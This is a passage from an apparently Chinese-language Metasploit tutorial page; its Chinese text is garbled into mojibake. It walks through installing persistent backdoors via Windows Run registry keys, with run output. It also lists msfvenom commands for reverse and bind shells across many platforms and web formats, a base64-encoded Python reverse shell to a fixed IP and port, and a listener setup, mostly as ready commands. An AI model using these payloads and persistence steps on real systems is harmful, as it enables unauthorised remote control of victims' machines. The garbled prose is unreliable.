class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; info post/windows/manage/persistence_exe</span><br><span class="line"></span><br><span class="line">       Name: Windows Manage Persistent EXE Payload Installer</span><br><span class="line">     Module: post/windows/manage/persistence_exe</span><br><span class="line">   Platform: Windows</span><br><span class="line">       Arch: </span><br><span class="line">       Rank: Normal</span><br><span class="line"></span><br><span class="line">Provided by:</span><br><span class="line">  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">Compatible session types:</span><br><span class="line">  Meterpreter</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  Name      Current Setting  Required  Description</span><br><span class="line">  ----      ---------------  --------  -----------</span><br><span class="line">  REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">  REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">  SESSION                    yes       The session to run this module on.</span><br><span class="line">  STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This Module will upload an executable to a remote host and make it </span><br><span class="line">  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER </span><br><span class="line">  will start on user login, SYSTEM will start on system boot but </span><br><span class="line">  requires privs. SERVICE will create a new service which will start </span><br><span class="line">  the payload. Again requires privs.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module options (post/windows/manage/persistence_exe):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   REXENAME  default.exe      yes       The name to call exe on remote system</span><br><span class="line">   REXEPATH                   yes       The remote executable to upload and execute.</span><br><span class="line">   SESSION                    yes       The session to run this module on.</span><br><span class="line">   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</span><br></pre></td></tr></table></figure>æ­¤æ¨¡å—å°†å¯æ‰§è¡Œæ–‡ä»¶ä¸Šè½½åˆ°è¿œç¨‹ä¸»æœºå¹¶è¿›è¡Œåˆ›å»ºæŒä¹…æ€§ã€‚<br>æ¶‰åŠåˆ°å››ä¸ªå‚æ•°<ul><li>REXENAMEæ˜¯æ‹·è´åˆ°ç›®æ ‡ç³»ç»Ÿä¸­çš„åå­—</li><li>EXEPATHæ˜¯å°†è¦ä¸Šä¼ çš„åé—¨åœ¨æœ¬åœ°çš„ä½ç½®</li><li>SESSIONæ˜¯é€‰æ‹©è¿è¡Œæ­¤æ¨¡å—çš„ä¼šè¯</li><li>STARTUPæ˜¯å¯åŠ¨ç±»å‹ï¼Œæœ‰USERã€SYSTEMã€SERVICEè¿™ä¸‰ç§å–å€¼ï¼ŒUSERè¡¨ç¤ºä¸ºå°†åœ¨ç”¨æˆ·ç™»å½•æ—¶å¯åŠ¨ï¼ŒSYSTEMè¡¨ç¤ºå°†åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶å¯åŠ¨(éœ€è¦æƒé™)ï¼ŒSERVICEè¡¨ç¤ºå°†åˆ›å»ºä¸€ä¸ªå¯åŠ¨æœåŠ¡é¡¹(éœ€è¦æƒé™)ã€‚</li></ul>å°è¯•ä¸€ä¸‹ï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Reading Payload from file /home/ubuntu/shell.exe</span><br><span class="line">[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe</span><br><span class="line">[+] Agent executed with PID 3684</span><br><span class="line">[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI</span><br><span class="line">[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc</span><br></pre></td></tr></table></figure>4.registry_persistenceå®Œæ•´è·¯å¾„ä¸ºexploit/windows/local/registry_persistenceå’Œç¬¬ä¸€ç§æ–¹æ³•ç±»ä¼¼ï¼Œæ­¤æ¨¡å—å°†ä¼šå®‰è£…ä¸€ä¸ªpayloadåˆ°æ³¨å†Œè¡¨çš„å¯åŠ¨é¡¹ä¸­ã€‚<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 13...</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistence</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/registry_persistence):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)</span><br><span class="line">   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)</span><br><span class="line">   CREATE_RC      true             no        Create a resource file for cleanup</span><br><span class="line">   RUN_NAME                        no        The name to use for the &#x27;Run&#x27; key. (Default: random)</span><br><span class="line">   SESSION                         yes       The session to run this module on.</span><br><span class="line">   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)</span><br><span class="line">   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; set SESSION 13</span><br><span class="line">SESSION =&gt; 13</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Generating payload blob..</span><br><span class="line">[+] Generated payload, 6048 bytes</span><br><span class="line">[*] Root path is HKCU</span><br><span class="line">[*] Installing payload blob..</span><br><span class="line">[+] Created registry key HKCU\Software\0BaG3zDR</span><br><span class="line">[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD</span><br><span class="line">[*] Installing run key</span><br><span class="line">[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB</span><br><span class="line">[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc</span><br></pre></td></tr></table></figure>åŒç±»å‹çš„è¿˜æœ‰å…¶ä»–payloadï¼Œå¦‚exploit/windows/local/vss_persistenceï¼Œexploit/windows/local/s4u_persistenceã€‚<h2 id="å‚è€ƒ-3"><a href="#å‚è€ƒ-3" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><a href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></li><li><a href="https://www.anquanke.com/post/id/164525">https://www.anquanke.com/post/id/164525</a></li><li><a href="https://www.freebuf.com/sectool/118714.html">è®¿é—®çš„æ–‡ç« å®¡æ ¸ä¸­â€¦ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a>## 1. å®‰è£…è¿è¡ŒåŠåˆå§‹åŒ–å®‰è£…<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># å®‰è£…</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line"></span><br><span class="line"># å®‰è£…å®Œæˆåä½ç½®</span><br><span class="line"># /opt/metasploit-framework/embedded/framework/</span><br><span class="line"></span><br><span class="line"># ç›®å½•ç»“æ„ </span><br><span class="line">--modules é‡ç‚¹çœ‹è¿™é‡Œå°±è¡Œäº†</span><br><span class="line">  --auxiliary ä¸»è¦åŒ…å«è¾…åŠ©æ€§è„šæœ¬(æ‰«æã€å—…æ¢ã€æ³¨å…¥ã€çˆ†ç ´ï¼Œæ¼æ´æŒ–æ˜)</span><br><span class="line">  --encoders ä¸»è¦åŒ…å«å„ç§ç¼–ç å·¥å…·ï¼Œä»¥ä¾¿ç»•è¿‡å…¥ä¾µæ£€æµ‹å’Œè¿‡æ»¤ç³»ç»Ÿ</span><br><span class="line">  --exploits æ¼æ´åˆ©ç”¨ï¼ŒåŒ…å«ä¸»æµçš„æ¼æ´åˆ©ç”¨è„šæœ¬ï¼Œexpå‘½åè§„åˆ™:ç³»ç»Ÿ/æœåŠ¡/æ¨¡å—</span><br><span class="line">  --nops ç»•è¿‡é’ˆå¯¹æº¢å‡ºæ”»å‡»æ»‘è¡Œå­—ç¬¦ä¸²çš„æ‹¦æˆªæ£€æµ‹</span><br><span class="line">  --payloads æ”»å‡»è·è½½ï¼Œä¸»è¦åœ¨ç›®æ ‡æœºå™¨æ‰§è¡Œä»£ç </span><br><span class="line">  --post æ­¤ç›®å½•æ”¾ç€msfçš„exploitæ‰§è¡ŒæˆåŠŸåï¼Œå‘ç›®æ ‡å‘é€çš„ä¸€äº›åŠŸèƒ½æ€§æŒ‡ä»¤ï¼Œå¦‚ææƒï¼Œè·å–hashç­‰</span><br><span class="line">  --evasion æ–°å¢ï¼Œç”¨æ¥ç”Ÿæˆå…æ€payloadï¼Œç±»ä¼¼äºé›†æˆmsfvenomåŠŸèƒ½</span><br><span class="line">--data æ”¾äº†meterpreter ï¼ŒpassiveXï¼Œvncï¼ŒDLLsï¼Œç­‰è¿™äº›å·¥å…·å’Œä¸€äº›ç”¨æˆ·æ¥å£ä»£ç ï¼Œmsfweb å’Œä¸€äº›å…¶ä»–æ¨¡å—ç”¨åˆ°çš„æ•°æ®æ–‡ä»¶</span><br><span class="line">--plugins è¿™é‡Œçš„æ¨¡å—ç”¨æˆ·éœ€è¦loadæ¥åŠ è½½ï¼Œæä¾›æ•°æ®åº“è¿æ¥æ’ä»¶å’Œå„ç§è¦ç”¨åˆ°çš„æ’ä»¶</span><br><span class="line">--scripts è¿™ä¸ªç›®å½•ä¸‹çš„æ–‡ä»¶å¤§éƒ½æ˜¯meterpreterè¿™ä¸ªæ¨¡å—åˆ©ç”¨çš„è„šæœ¬ï¼Œæ¯”å¦‚ç”¨åˆ°migrateæ¥è½¬ç§»åˆ°å…¶ä»–è¿›ç¨‹çš„æŒ‡ä»¤çš„æºä»£ç å°±åœ¨æ­¤</span><br><span class="line">--tools åŒ…å«ä¸€äº›æœ‰ç”¨çš„è„šæœ¬å’Œé›¶æ•£çš„å·¥å…·</span><br></pre></td></tr></table></figure>å¯åŠ¨<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># è¿è¡Œ</span><br><span class="line">$ msfconsole</span><br><span class="line"># åˆå§‹åŒ–æ•°æ®åº“</span><br><span class="line">$ msfdb init</span><br><span class="line"># é‡å»ºç¼“å­˜</span><br><span class="line">$ db_rebuild_cache</span><br><span class="line"># æŸ¥çœ‹æ•°æ®åº“è¿æ¥æƒ…å†µ</span><br><span class="line">$ db_status</span><br></pre></td></tr></table></figure><h2 id="2-msfåŸºæœ¬å‘½ä»¤-4"><a href="#2-msfåŸºæœ¬å‘½ä»¤-4" class="headerlink" title="2. msfåŸºæœ¬å‘½ä»¤"></a>2. msfåŸºæœ¬å‘½ä»¤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">show exploits â€“ æŸ¥çœ‹æ‰€æœ‰å¯ç”¨çš„æ¸—é€æ”»å‡»ç¨‹åºä»£ç  </span><br><span class="line">show auxiliary â€“ æŸ¥çœ‹æ‰€æœ‰å¯ç”¨çš„è¾…åŠ©æ”»å‡»å·¥å…· </span><br><span class="line">show options â€“ æŸ¥çœ‹è¯¥æ¨¡å—æ‰€æœ‰å¯ç”¨é€‰é¡¹ </span><br><span class="line">show payloads â€“ æŸ¥çœ‹è¯¥æ¨¡å—é€‚ç”¨çš„æ‰€æœ‰è½½è·ä»£ç  </span><br><span class="line">show targets â€“ æŸ¥çœ‹è¯¥æ¨¡å—é€‚ç”¨çš„æ”»å‡»ç›®æ ‡ç±»å‹</span><br><span class="line">search â€“ æ ¹æ®å…³é”®å­—æœç´¢æŸæ¨¡å— </span><br><span class="line">info â€“ æ˜¾ç¤ºæŸæ¨¡å—çš„è¯¦ç»†ä¿¡æ¯ </span><br><span class="line">use â€“ è¿›å…¥ä½¿ç”¨æŸæ¸—é€æ”»å‡»æ¨¡å— </span><br><span class="line">back â€“ å›é€€ </span><br><span class="line">set/unset â€“ è®¾ç½®/ç¦ç”¨æ¨¡å—ä¸­çš„æŸä¸ªå‚æ•° </span><br><span class="line">setg/unsetg â€“ è®¾ç½®/ç¦ç”¨é€‚ç”¨äºæ‰€æœ‰æ¨¡å—çš„å…¨å±€å‚æ•° </span><br><span class="line">save â€“ å°†å½“å‰è®¾ç½®å€¼ä¿å­˜ä¸‹æ¥ï¼Œä»¥ä¾¿ä¸‹æ¬¡å¯åŠ¨MSFç»ˆç«¯æ—¶ä»å¯ä½¿ç”¨</span><br></pre></td></tr></table></figure><h2 id="3-msfvenomç”Ÿæˆpayload-4"><a href="#3-msfvenomç”Ÿæˆpayload-4" class="headerlink" title="3 msfvenomç”Ÿæˆpayload"></a>3 msfvenomç”Ÿæˆpayload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-p, --payload    &lt;payload&gt;       æŒ‡å®šéœ€è¦ä½¿ç”¨çš„payload(æ”»å‡»è·è½½)</span><br><span class="line">-l, --list       [module_type]   åˆ—å‡ºæŒ‡å®šæ¨¡å—çš„æ‰€æœ‰å¯ç”¨èµ„æº,æ¨¡å—ç±»å‹åŒ…æ‹¬: payloads, encoders, nops, all</span><br><span class="line">-n, --nopsled    &lt;length&gt;        ä¸ºpayloadé¢„å…ˆæŒ‡å®šä¸€ä¸ªNOPæ»‘åŠ¨é•¿åº¦</span><br><span class="line">-f, --format     &lt;format&gt;        æŒ‡å®šè¾“å‡ºæ ¼å¼ (ä½¿ç”¨ --help-formats æ¥è·å–msfæ”¯æŒçš„è¾“å‡ºæ ¼å¼åˆ—è¡¨)</span><br><span class="line">-e, --encoder    [encoder]       æŒ‡å®šéœ€è¦ä½¿ç”¨çš„encoderï¼ˆç¼–ç å™¨ï¼‰</span><br><span class="line">-a, --arch       &lt;architecture&gt;  æŒ‡å®špayloadçš„ç›®æ ‡æ¶æ„</span><br><span class="line">    --platform   &lt;platform&gt;      æŒ‡å®špayloadçš„ç›®æ ‡å¹³å°</span><br><span class="line">-s, --space      &lt;length&gt;        è®¾å®šæœ‰æ•ˆæ”»å‡»è·è½½çš„æœ€å¤§é•¿åº¦</span><br><span class="line">-b, --bad-chars  &lt;list&gt;          è®¾å®šè§„é¿å­—ç¬¦é›†ï¼Œæ¯”å¦‚: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line">-i, --iterations &lt;count&gt;         æŒ‡å®špayloadçš„ç¼–ç æ¬¡æ•°</span><br><span class="line">-c, --add-code   &lt;path&gt;          æŒ‡å®šä¸€ä¸ªé™„åŠ çš„win32 shellcodeæ–‡ä»¶</span><br><span class="line">-x, --template   &lt;path&gt;          æŒ‡å®šä¸€ä¸ªè‡ªå®šä¹‰çš„å¯æ‰§è¡Œæ–‡ä»¶ä½œä¸ºæ¨¡æ¿</span><br><span class="line">-k, --keep                       ä¿æŠ¤æ¨¡æ¿ç¨‹åºçš„åŠ¨ä½œï¼Œæ³¨å…¥çš„payloadä½œä¸ºä¸€ä¸ªæ–°çš„è¿›ç¨‹è¿è¡Œ</span><br><span class="line">    --payload-options            åˆ—ä¸¾payloadçš„æ ‡å‡†é€‰é¡¹</span><br><span class="line">-o, --out   &lt;path&gt;               ä¿å­˜payload</span><br><span class="line">-v, --var-name &lt;name&gt;            æŒ‡å®šä¸€ä¸ªè‡ªå®šä¹‰çš„å˜é‡ï¼Œä»¥ç¡®å®šè¾“å‡ºæ ¼å¼</span><br><span class="line">    --shellest                   æœ€å°åŒ–ç”Ÿæˆpayload</span><br><span class="line">-h, --help                       æŸ¥çœ‹å¸®åŠ©é€‰é¡¹</span><br><span class="line">    --help-formats               æŸ¥çœ‹msfæ”¯æŒçš„è¾“å‡ºæ ¼å¼åˆ—è¡¨</span><br></pre></td></tr></table></figure>1.å¯æ‰§è¡Œç¨‹åºLinux<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">åå‘è¿æ¥ï¼š</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line">æ­£å‘è¿æ¥ï¼š</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>Windows<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>Mac<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>æ‰§è¡Œæ–¹å¼ï¼šç›´æ¥å¤åˆ¶å¯æ‰§è¡Œç¨‹åºåˆ°ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œå°±è¡Œäº†ã€‚2.Web PayloadsPHP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>ASP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>JSP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>WAR<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>æ‰§è¡Œæ–¹å¼ï¼šå°†shell.phpæ”¾åœ¨webç›®å½•ä¸‹ï¼Œä½¿ç”¨æµè§ˆå™¨è®¿é—®ï¼Œæˆ–è€…ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ‰§è¡Œï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure>3.è„šæœ¬shellPython<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>Bash<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>Perl<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>æ‰§è¡Œæ–¹å¼ï¼šå¤åˆ¶shell.pyä¸­çš„å†…å®¹åœ¨linuxå‘½ä»¤è¡Œä¸‹æ‰§è¡Œï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#x27;.decode(&#x27;base64&#x27;))&quot;</span><br></pre></td></tr></table></figure>4.shellcode<br>Linux Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>Windows Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>Mac Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure><h2 id="4-MeterpreteråŸºæœ¬å‘½ä»¤-4"><a href="#4-MeterpreteråŸºæœ¬å‘½ä»¤-4" class="headerlink" title="4. MeterpreteråŸºæœ¬å‘½ä»¤"></a>4. MeterpreteråŸºæœ¬å‘½ä»¤</h2>é¦–å…ˆéœ€è¦å…ˆè·å–meterpreterï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.81.160</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z # -j(è®¡åˆ’ä»»åŠ¡ä¸‹è¿›è¡Œæ”»å‡»ï¼Œåå°) -z(æ”»å‡»å®Œæˆä¸é‡ä¼šè¯äº¤äº’)</span><br><span class="line">jobs  # æŸ¥çœ‹åå°æ”»å‡»ä»»åŠ¡ </span><br><span class="line">kill &lt;id&gt;  # åœæ­¢æŸåå°æ”»å‡»ä»»åŠ¡ </span><br><span class="line">sessions -l  # (æŸ¥çœ‹ä¼šè¯)</span><br><span class="line">sessions -i 2   # é€‰æ‹©ä¼šè¯</span><br><span class="line">sessions -k 2   # ç»“æŸä¼šè¯</span><br></pre></td></tr></table></figure>å¦‚æœå…ˆè·å–äº†cmdï¼Œæ¯”å¦‚åˆ©ç”¨ms17-010ï¼Œé»˜è®¤ä½¿ç”¨çš„payloadè¿”å›çš„å°±æ˜¯cmdã€‚è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>sessions-u 2</code>æ¥å°†cmdshellå‡çº§æˆmeterpreterã€‚è·å–åˆ°äº†meterpreterï¼Œå°±å¯ä»¥è¿›è¡Œåæ¸—é€äº†ã€‚<h3 id="4-1-åŸºæœ¬ç³»ç»Ÿå‘½ä»¤-4"><a href="#4-1-åŸºæœ¬ç³»ç»Ÿå‘½ä»¤-4" class="headerlink" title="4.1 åŸºæœ¬ç³»ç»Ÿå‘½ä»¤"></a>4.1 åŸºæœ¬ç³»ç»Ÿå‘½ä»¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 